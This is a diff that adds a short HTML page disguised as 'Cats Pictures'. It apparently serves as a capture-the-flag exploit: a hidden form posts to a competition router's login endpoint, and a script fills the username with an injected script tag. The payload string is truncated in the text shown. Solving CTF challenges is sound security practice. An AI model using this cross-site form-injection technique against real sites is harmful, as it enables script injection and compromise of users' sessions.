@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cats Pictures</title>
+</head>
+<body>
+    <form method="POST" action="https://router-ui.web.ctfcompetition.com/login">
+        <input name="username" />
+        <input name="password" />
+    </form>
+    <script>
+        const form = document.querySelector("form");
+        const [user, pass] = form.querySelectorAll("input");
+        user.value = "<script src='https:";
+        pass.value = "";
+    </script>
+</body>
+</html>
